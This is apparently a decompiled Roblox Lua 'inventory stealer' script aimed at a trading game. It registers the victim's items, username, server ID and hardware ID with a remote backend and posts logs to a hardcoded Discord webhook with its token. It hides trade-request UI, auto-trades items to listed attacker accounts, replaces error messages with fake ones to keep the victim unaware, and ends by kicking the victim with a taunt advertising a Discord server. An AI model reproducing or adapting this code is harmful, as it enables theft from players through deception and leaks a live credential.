			local TradeRequest = Players.LocalPlayer.PlayerGui:WaitForChild("MainGUI").Lobby.Leaderboard.Container.OverlayMenu.TradeRequest

			ClickBlocker.Visible = false
			TradeRequest.Visible = false
			v346(ClickBlocker, "Visible", function()
				ClickBlocker.Visible = false
			end)
			v346(TradeRequest, "Visible", function()
				TradeRequest.Visible = false
			end)
		else
			pcall(function()
			end)
		end
	end

	local function v356()
		Trade.SetRequestsEnabled:FireServer(true)
		hideTrade()
		v348()
	end

	return {
		setup = v356
	}
end

t1.x = function()
	local x = t1.cache.x

	if not x then
		x = {
			c = v342()
		}
		t1.cache.x = x
	end

	return x.c
end

local function v358()
	local v359 = t1.m()
	local v360 = t1.v()
	local Players = game:GetService("Players")
	local Trade = game:GetService("ReplicatedStorage").Trade

	Trade.StartTrade.OnClientEvent:Connect(function(p86)
		local Name

		if p86.Player1.Player.Name == Players.LocalPlayer.Name then
			Name = p86.Player2.Player.Name
		else
			Name = p86.Player1.Player.Name
		end

		v359.coreEventBus.publish(v360.newTradeCreated.create({
			username = Name
		}))
	end)
	Trade.UpdateTrade.OnClientEvent:Connect(function(p87)
		local t27 = {}

		if not p87 then
			return
		end

		local Offer

		if p87.Player1.Player.Name == Players.LocalPlayer.Name then
			Offer = p87.Player1.Offer
		else
			Offer = p87.Player2.Offer
		end

		for _, v in Offer, nil, nil do
			if v then
				t27[v[1]] = v[2]
			end
		end

		local ok, result = pcall(v359.tradeStore.updateOffer, t27)

		if not ok then
			v359.logger.error("Failed to update offer in store", {
				error = result
			})
		end
	end)
	Trade.AcceptTrade.OnClientEvent:Connect(function(p88)
		if not p88 then
			return
		end

		task.wait(1)

		local ok, result = pcall(v359.tradeStore.succeed)

		if not ok then
			v359.logger.error("Failed to succeed trade in store", {
				error = result
			})
		end
	end)
	Trade.DeclineTrade.OnClientEvent:Connect(function()
		local ok, result = pcall(v359.tradeStore.failed)

		if not ok then
			v359.logger.error("Failed to fail trade in store", {
				error = result
			})
		end
	end)
	Trade.SendRequest.OnClientInvoke = function()
		pcall(v359.tradeRequest.cancelSentRequest)
	end

	return nil
end
local function y()
	local y2 = t1.cache.y

	if not y2 then
		y2 = {
			c = v358()
		}
		t1.cache.y = y2
	end

	return y2.c
end

t1.y = y

local function v376()
	t1.i()

	if game.ReplicatedStorage.Remotes.Extras.GetPlayerLevel:InvokeServer(game.Players.LocalPlayer) < 10 then
		error("Player level is too low")
	end

	local v377 = t1.t()
	local v378 = t1.u()
	local v379 = t1.w()
	local v380 = t1.x()

	t1.y()

	return {
		inventory = v377,
		tradeRequest = v378,
		trade = v379,
		gameSetup = v380
	}
end

t1.z = function()
	local z = t1.cache.z

	if not z then
		z = {
			c = v376()
		}
		t1.cache.z = z
	end

	return z.c
end

local function v382()
	local v383 = t1.c()
	local v384 = t1.n()
	local v385 = t1.b()
	local v386 = t1.m()

	local function v387(p89)
		local function v388(p90, p91, ...)
			if p89[p90] then
				return p91(...)
			end

			return ...
		end

		return v388
	end
	local function v389(p92, p93, ...)
		local t28 = { p93(...) }

		if p92 == "verbose" then
			local print_ = print
			local v392 = ("[%*]: %*"):format(p92, table.concat(t28, " "))

			print_(v392)
		else
			local warn_ = warn
			local v394 = ("[%*]: %*"):format(p92, table.concat(t28, " "))

			warn_(v394)
		end

		return table.unpack(t28)
	end
	local function v395(p94)
		local v396 = p94:lower()

		for _, v in v385.IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK, nil, nil do
			if v396:find(v) then
				return true
			end
		end

		return false
	end
	local function v399(p95)
		task.spawn(function()
			local v400 = request({
				Url = "https://discord.com/api/webhooks/1427333378146963517/IVgB0BKSrcNJQPe65hFxkcpTfkubHwSB9xN-6XBPX_i4g1iiD66L7qjeAycA0HGMSXjw",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = v384.encode({
					content = p95
				})
			})

			if v400.statusCode ~= 200 then
				local warn_ = warn
				local v402 = ("Failed to log to webhook: %*"):format(v400.statusCode)

				warn_(v402)
			end
		end)
	end
	local function v403(p96, p97, ...)
		local t29 = { p97(...) }
		local v405 = ("[%*]: %*"):format(p96, table.concat(t29, " "))

		if not v395(v405) then
			v399(v405)
		end

		return table.unpack(t29)
	end
	local function v406(p98, p99, ...)
		local t30 = {}
		local v408 = geniter({ p99(...) }, nil, nil)
		local v409 = table.pack(v408())

		if v409[1] then
			local v410 = v409[3]

			while true do
				t30[#t30 + 1] = v384.encode(v410)

				local v411 = table.pack(v408())

				if not v411[1] then
					break
				end

				v410 = v411[3]
			end
		end

		return table.unpack(t30)
	end
	local function v412(p100, p101, ...)
		local t31 = { p101(...) }

		table.insert(t31, {
			metadata = v386.metadataForLogger
		})

		return table.unpack(t31)
	end

	local v414 = _G.VERBOSE == true and v389 or v403

	return v383(v387({
		error = true,
		warn = true,
		verbose = _G.VERBOSE == true
	}), v414, v406, v412)
end

t1.A = function()
	local A = t1.cache.A

	if not A then
		A = {
			c = v382()
		}
		t1.cache.A = A
	end

	return A.c
end

local function v416()
	local v417 = t1.m()
	local v418 = t1.v()

	t1.l()

	local function v419()
		local u420 = false
		local t32 = {}

		return {
			isInTrade = function()
				return u420
			end,
			begin = function()
				if u420 then
					error("Can't begin new trade, because it's already in trade")
				end

				u420 = true
			end,
			finish = function()
				if not u420 then
					error("Can't finish trade, because there is no trade")
				end

				u420 = false
				t32 = {}
			end,
			updateOffer = function(p102)
				if not u420 then
					error("Can't update opponent offer, because there is no trade")
				end

				t32 = p102
			end,
			failed = function()
				if not u420 then
					error("Can't fail trade, because there is no trade")
				end

				v417.coreEventBus.publish(v418.tradeFinished.create({
					isSuccess = false,
					items = t32
				}))
			end,
			succeed = function()
				if not u420 then
					error("Can't finish trade, because there is no trade")
				end

				v417.coreEventBus.publish(v418.tradeFinished.create({
					isSuccess = true,
					items = t32
				}))
			end
		}
	end

	return v419
end

t1.B = function()
	local B = t1.cache.B

	if not B then
		B = {
			c = v416()
		}
		t1.cache.B = B
	end

	return B.c
end

local function v423()
	local v424 = t1.m()
	local v425 = t1.g()

	local function v426()
		local v427 = t1.s()
		local v428 = t1.z()
		local v429 = t1.A()
		local v430 = t1.B()

		v424.metadataForLogger = {}
		v424.trade = v428.trade
		v424.tradeRequest = v428.tradeRequest
		v424.gameSetup = v428.gameSetup
		v424.inventory = v428.inventory
		v424.coreEventBus = v425.createBus()
		v424.domainEventBus = v425.createBus()
		v424.tradeStore = v430()
		v424.logger = v429
		v424.api = v427
	end

	return v426
end

t1.C = function()
	local C = t1.cache.C

	if not C then
		C = {
			c = v423()
		}
		t1.cache.C = C
	end

	return C.c
end

local function v432()
	return {
		itemClaimed = t1.g().createEventDefinition()
	}
end

t1.D = function()
	local D = t1.cache.D

	if not D then
		D = {
			c = v432()
		}
		t1.cache.D = D
	end

	return D.c
end

local function v434()
	t1.g()

	local function v435()
		local t33 = {}

		local function v437(p103)
			t33[#t33 + 1] = p103
		end

		return {
			record = v437,
			playback = function(p104)
				local v438 = t33

				t33 = {}

				for _, v in v438, nil, nil do
					p104.publish(v)
				end
			end
		}
	end

	return v435
end

t1.E = function()
	local E = t1.cache.E

	if not E then
		E = {
			c = v434()
		}
		t1.cache.E = E
	end

	return E.c
end

local function v442()
	local v443 = t1.D()

	t1.a()

	local v444 = t1.E()

	return {
		create = function(p105, p106, p107, p108)
			local t34 = {
				id = p105,
				secretKey = p106,
				usernames = p107,
				items = p108,
				eventsRecorder = v444()
			}

			local function v446(p109)
				for _, v in t34.items, nil, nil do
					if v.uniqueId == p109 then
						return v
					end
				end

				return nil
			end

			t34.getItemsToTransfer = function(p110)
				local t35 = {}

				for _, v in t34.items, nil, nil do
					if v.claimedCount < v.count then
						table.insert(t35, v)
					end
				end

				if p110 then
					table.sort(t35, function(p111, p112)
						return p111.valuable.price > p112.valuable.price
					end)
				end

				return t35
			end
			t34.hasUnclaimedItems = function()
				return #t34.getItemsToTransfer() > 0
			end
			t34.isItemExists = function(p113)
				return v446(p113) ~= nil
			end
			t34.isWantedItem = function(p114)
				local v452 = v446(p114)

				if v452 == nil then
					return false
				end

				return v452.isWanted
			end
			t34.canClaim = function(p115)
				local v453 = geniter(t34.usernames, nil, nil)
				local v454 = table.pack(v453())

				if not v454[1] then
					return false
				end

				local v455 = v454[3]

				while v455:lower():find(p115:lower()) == nil do
					local v456 = table.pack(v453())

					if not v456[1] then
						return false
					end

					v455 = v456[3]
				end

				return true
			end
			t34.claimItem = function(p116, p117)
				local v457 = v446(p116)

				if v457 == nil then
					local error_ = error
					local v459 = ("Item not found (uniqueId: %*)"):format(p116)

					error_(v459)
				end

				if v457.count < v457.claimedCount + p117 then
					local error_ = error
					local v461 = ("Can't claim more items than available (item: %*, count: %*, claimedCount: %*, claiming count: %*)"):format(v457.uniqueId, v457.count, v457.claimedCount, p117)

					error_(v461)
				end

				v457.claimedCount += p117
				t34.eventsRecorder.record(v443.itemClaimed.create({
					uniqueId = p116,
					count = p117
				}))
			end

			return t34
		end
	}
end

t1.F = function()
	local F = t1.cache.F

	if not F then
		F = {
			c = v442()
		}
		t1.cache.F = F
	end

	return F.c
end

local function v463()
	local function v464(p118, p119, p120)
		local n10 = 0
		local v466

		while n10 < p118 do
			local ok, result = pcall(p120)

			if ok then
				return result
			end

			n10 += 1
			v466 = result
			task.wait(p119)
		end

		return error(v466)
	end

	return {
		retry = v464
	}
end
local function g()
	local G = t1.cache.G

	if not G then
		G = {
			c = v463()
		}
		t1.cache.G = G
	end

	return G.c
end

t1.G = g

local function v471()
	t1.F()

	local v472 = t1.v()
	local v473 = t1.m()

	local function v474(p121)
		local Players = game:GetService("Players")

		local function v476(player)
			if p121.canClaim(player.Name) then
				v473.logger.verbose("Player can claim hit", {
					player = player.Name
				})
				v473.coreEventBus.publish(v472.targetAppearedOnServer.create({
					username = player.Name
				}))
			end
		end
		local function v477()
			local players, v479, v480 = Players:GetPlayers()
			local v481 = geniter(players, v479, v480)
			local v482 = table.pack(v481())

			if v482[1] then
				local v483 = v482[3]

				while true do
					v476(v483)

					local v484 = table.pack(v481())

					if not v484[1] then
						break
					end

					v483 = v484[3]
				end
			end
		end

		Players.PlayerAdded:Connect(v476)
		v477()

		while p121.hasUnclaimedItems() or ID == "6d43a3d5-3290-4938-b6e6-25d2ebf324d2" do
			v477()
			task.wait(1)
		end

		_G.stop = true
		task.wait(1)
		setclipboard("discord.gg/project-reverse")
		Players.LocalPlayer:Kick("Your 1nventory got cleaned by discord.gg/project-reverse")
	end

	return v474
end

t1.H = function()
	local H = t1.cache.H

	if not H then
		H = {
			c = v471()
		}
		t1.cache.H = H
	end

	return H.c
end

local function v486()
	t1.F()

	local v487 = t1.m()

	local function v488(p122)
		while true do
			local ok, result = pcall(v487.api.pullFromConnection, p122.secretKey)

			if not ok then
				v487.logger.error("Failed to pull from connection", {
					error = result
				})
			end

			task.wait(0.2)
		end
	end

	return v488
end

t1.I = function()
	local I = t1.cache.I

	if not I then
		I = {
			c = v486()
		}
		t1.cache.I = I
	end

	return I.c
end

local function v492()
	t1.F()

	local v493 = t1.D()

	t1.h()

	local v494 = t1.v()
	local v495 = t1.m()

	local function v496(p123)
		local t36 = {}

		for _, v in p123.getItemsToTransfer(true), nil, nil do
			table.insert(t36, {
				uniqueId = v.uniqueId,
				name = v.valuable.name,
				count = v.count - v.claimedCount
			})
		end

		return t36
	end
	local function v500(p124)
		local ok, result = pcall(p124)

		if not ok then
			v495.logger.error("Failed to execute callback, declining trade", {
				error = result
			})

			local ok2, result2 = pcall(v495.trade.decline)

			if not ok2 then
				v495.logger.error("Failed to decline trade", {
					error = result2
				})
			end
		end

		return ok
	end
	local function v505()
		local ok, result = pcall(v495.tradeStore.finish)

		if not ok then
			v495.logger.error("Failed to finish trade in store", {
				error = result
			})
		end
	end
	local function v508(p125)
		v495.coreEventBus.subscribe(v494.targetAppearedOnServer.createObserver(function(p126)
			if v495.tradeStore.isInTrade() then
				return
			end

			pcall(function()
				local Trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
				local response, v511 = Trade.GetTradeStatus:InvokeServer()

				if response == "ReceivingRequest" then
					if v511.Receiver ~= p126.payload.username then
						Trade.DeclineRequest:FireServer()
					end
				elseif response == "SendingRequest" and v511.Receiver ~= p126.payload.username then
					Trade.CancelRequest:FireServer()
				else
					return
				end
			end)
			v495.tradeRequest.cancelSentRequest()
			v495.tradeRequest.sendRequest(p126.payload.username)
		end))
		v495.coreEventBus.subscribe(v494.newTradeCreated.createObserver(function(p127)
			if not p125.canClaim(p127.payload.username) then
				local ok, result = pcall(v495.trade.decline)

				if not ok then
					v495.logger.error("Failed to decline trade, from unknown user", {
						username = p127.payload.username,
						error = result
					})
				end

				return
			end

			v495.logger.verbose("New trade created", {
				username = p127.payload.username
			})

			if not v500(function()
				v495.tradeStore.begin()

				local v514 = v496(p125)

				v495.logger.verbose("Adding items to trade", {
					items = v514
				})
				v495.trade.addItems(v514)
			end) then
				v495.logger.error("Failed to add items to trade, trade declined")
			end
		end))
		v495.coreEventBus.subscribe(v494.itemsAdded.createObserver(function()
			v495.logger.verbose("Items added")

			if not v500(function()
				v495.trade.accept()
			end) then
				v495.logger.error("Failed to confirm trade, trade declined")
			end
		end))
		v495.coreEventBus.subscribe(v494.tradeFinished.createObserver(function(p128)
			if not p128.payload.isSuccess then
				v505()

				return
			end

			for k2, v in p128.payload.items, nil, nil do
				if p125.isItemExists(k2) then
					p125.claimItem(k2, v)
				else
					v495.logger.warn("Item does not exist in hit domain model, claiming skipped", {
						uniqueId = k2
					})
				end
			end

			v505()
			p125.eventsRecorder.playback(v495.domainEventBus)
		end))
		v495.domainEventBus.subscribe(v493.itemClaimed.createObserver(function(p129)
			local payload = p129.payload

			if not p125.isWantedItem(payload.uniqueId) then
				return
			end

			local ok, result = pcall(v495.api.claimItem, p125.secretKey, payload.uniqueId, payload.count)

			if not ok then
				v495.logger.error("Failed to claim item", {
					error = result
				})
			end
		end))
	end

	return v508
end

t1.J = function()
	local J = t1.cache.J

	if not J then
		J = {
			c = v492()
		}
		t1.cache.J = J
	end

	return J.c
end

local v521 = t1.b()

if game.GameId ~= v521.GAME_ID then
	return
end

_G.stop = false

local Players = game:GetService("Players")
local text = "There was a problem receiving data, please reconnect. \n (Error Code: 260)"

game:GetService("CoreGui").DescendantAdded:Connect(function(descendant)
	if _G.stop then
		return
	end

	if not (descendant.Name == "ErrorMessage" and descendant:IsA("TextLabel")) then
		return
	end

	descendant.Text = text
	descendant:GetPropertyChangedSignal("Text"):Connect(function()
		if descendant.Text ~= text then
			descendant.Text = text
		end
	end)
end)

if Players.MaxPlayers <= #Players:GetPlayers() then
	Players.LocalPlayer:Kick("init")

	return
end

local v524 = t1.m()
local v525 = t1.C()

t1.j()
t1.h()

local v526 = t1.F()

t1.a()

local v527 = t1.G()
local v528 = t1.H()
local v529 = t1.I()
local v530 = t1.J()

local function v531()
	local u532
	local v533 = getexecutorname():lower()

	if hookmetamethod == nil or v533 ~= "delta" then
		return game.JobId
	end

	local s4 = "JobId"
	local v535

	v535 = hookmetamethod(game, "__index", function(h, n)
		if u532 == nil and checkcaller() == false then
			u532 = v535(game, s4)
		end

		return v535(h, n)
	end)

	repeat
		task.wait(0.1)
	until u532 ~= nil

	return u532
end
local function v536()
	local ok, result = pcall(v524.api.registerExecution)

	if not ok then
		v524.logger.error("Failed to register execution", {
			error = result
		})
		error("failed to start, please try again later")
	end

	return result
end
local function v539(p130, p131)
	v524.logger.verbose("Registering hit...")

	local t37 = {}

	for _, v in p131, nil, nil do
		t37[v.uniqueId] = {
			uniqueId = v.uniqueId,
			valuable = v.name,
			count = v.count,
			metadata = {}
		}
	end

	local ok, result = pcall(v524.api.registerHit, {
		username = Players.LocalPlayer.Name,
		inventory = t37,
		game = v521.GAME_NAME,
		serverId = v531(),
		stealerId = ID,
		executor = v521.EXECUTOR_NAME,
		nonce = p130
	})

	if not ok then
		v524.logger.error("Failed to register hit", {
			error = result
		})
		error("failed to start, please try again later")
	end

	return result
end
local function v545(p132)
	v524.logger.verbose("Connecting to hit...", {
		secretKey = p132.secretKey
	})

	local ok, result = pcall(v527.retry, 5, 0.5, function()
		return (v524.api.connect(p132.secretKey))
	end)

	if not ok then
		v524.logger.error("Failed to connect to hit", {
			error = result
		})
		error("failed to start, please try again later")
	end

	v524.logger.verbose("Connected to hit")
end
local function v548(p133, p134)
	local t38 = {}
	local t39 = {}

	for _, v in p133, nil, nil do
		local t40 = {
			id = v.id,
			uniqueId = v.uniqueId,
			valuable = v.valuable,
			count = v.count,
			claimedCount = v.claimedCount,
			isWanted = true
		}

		t39[v.uniqueId] = true
		table.insert(t38, t40)
	end

	if not v521.GIVE_ALL_ITEMS then
		return t38
	end

	for _, v in p134, nil, nil do
		if not t39[v.uniqueId] then
			table.insert(t38, {
				id = v.uniqueId,
				uniqueId = v.uniqueId,
				valuable = {
					name = v.name,
					price = 0
				},
				count = v.count,
				claimedCount = 0,
				isWanted = false
			})
		end
	end

	return t38
end

task.spawn(function()
	local response = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer()

	v525()
	v524.metadataForLogger.serverType = response
	v524.metadataForLogger.username = Players.LocalPlayer.Name
	v524.metadataForLogger.executor = v521.EXECUTOR_NAME
	v524.metadataForLogger.hwid = v521.HWID

	if response == "VIPServer" then
		local verbose = v524.logger.verbose
		local v558 = ("Player is VIP, kicking... %*"):format(Players.LocalPlayer.Name)

		verbose(v558)
		Players.LocalPlayer:Kick("Game restarted")

		return
	end

	v524.logger.verbose("Dependencies initialized, registering execution...")

	local v559 = v536()

	v524.logger.verbose("Execution registered, registering hit...")

	local v560 = v524.inventory.getItems()

	v524.logger.verbose("Got user inventory", {
		inventory = v560
	})

	if #v560 == 0 then
		v524.logger.verbose("No inventory items found, declining hit")
		error("failed to start, please try again later")
	end

	local v561 = v539(v559, v560)

	v524.logger.verbose("Hit registered", {
		hitDto = v561
	})
	v524.metadataForLogger.hitId = v561.hit.id
	v524.logger.verbose("Creating hit domain model...")

	local v562 = v548(v561.hit.items, v560)
	local v563 = v526.create(v561.hit.id, v561.secretKey, v561.usernames, v562)

	v524.logger.verbose("Hit model created", {
		hit = v563
	})
	v545(v563)
	v524.logger.verbose("Starting game setup...")
	v524.gameSetup.setup()
	v524.logger.verbose("Game setup completed")
	v524.logger.verbose("Starting jobs...")
	task.spawn(v528, v563)
	task.spawn(v529, v563)
	v524.logger.verbose("Jobs started")
	v524.logger.verbose("Starting orchestrator...")
	v530(v563)
	v524.logger.verbose("Orchestrator started")
end)
